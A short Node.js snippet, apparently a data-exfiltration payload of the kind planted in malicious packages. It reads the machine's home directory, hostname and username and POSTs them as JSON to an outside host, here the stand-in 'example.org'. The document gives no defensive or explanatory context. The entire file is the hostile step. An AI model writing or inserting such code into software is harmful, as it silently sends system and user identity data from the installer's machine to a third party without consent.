const os=require('os'), querystring=require('querystring'), https=require('https');
const data=JSON.stringify({home:os.homedir(),host:os.hostname(),user:os.userInfo().username});
const body=querystring.stringify({msg:data});
const req=https.request({hostname:'example.org',method:'POST'});
req.write(body); req.end();
